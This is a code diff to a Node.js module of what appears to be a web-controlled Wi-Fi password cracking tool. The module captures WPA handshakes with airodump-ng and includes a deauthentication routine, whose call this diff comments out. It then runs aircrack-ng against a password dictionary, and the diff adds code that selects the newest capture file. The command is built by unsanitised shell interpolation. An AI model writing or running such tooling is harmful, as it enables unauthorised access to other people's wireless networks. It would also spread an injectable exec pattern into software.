@@ -6,6 +6,8 @@ let airodumpProcess = null;
 let aireplayProcesses = [];
 let io;
 const outputFilePath = '/tmp/ngcrack_output/airodump-output.txt';
+const WIFI_SCAN_OUTPUT_DIR = path.join('/tmp', 'ngcrack_output');
+const WIFI_SCAN_FILE_PREFIX = 'capture';
 
 function init(i) {
 		io = i;
@@ -54,12 +56,14 @@ function getPasswordStart(TARGET_ESSID, CHANNEL, TARGET_BSSID) {
         shell: true
     });
 	
+	
+	
 	// Monitor the output file for handshake capture
     monitorOutputFile('/tmp/ngcrack_output/airodump-output.txt', 'WPA handshake'); // Adjust the search string as necessary
 	io.emit('getPasswordMessage', `Waiting for WPA handshake...`);
-    
+	
 	// Start deauthentication
-    deauthenticate(TARGET_ESSID, TARGET_BSSID);
+    //deauthenticate(TARGET_ESSID, TARGET_BSSID);
 }
 
 function deauthenticate(TARGET_ESSID, TARGET_BSSID) {
@@ -99,9 +103,22 @@ function getPasswordPause() {
 	
 }
 
+function getLatestCapFile() {
+  const files = fs.readdirSync(WIFI_SCAN_OUTPUT_DIR);
+  const csvFiles = files
+    .filter(file => file.startsWith(WIFI_SCAN_FILE_PREFIX) && file.endsWith('.cap'))
+    .map(file => ({
+      file,
+      time: fs.statSync(path.join(WIFI_SCAN_OUTPUT_DIR, file)).mtime.getTime()
+    }))
+    .sort((a, b) => b.time - a.time);
+
+  return csvFiles.length > 0 ? path.join(WIFI_SCAN_OUTPUT_DIR, csvFiles[0].file) : null;
+}
+
 function startCracking() {
     // Assuming the handshake file is named correctly and exists. This might need to be dynamically determined.
-    const capFile = '/tmp/ngcrack_output/capture-01.cap';
+    const capFile = getLatestCapFile();
     const dictionaryPath = '/var/www/kozone/nodejs/dictionary/wifi_passwords.txt';
     
     exec(`aircrack-ng ${capFile} -w ${dictionaryPath}`, (error, stdout, stderr) => {
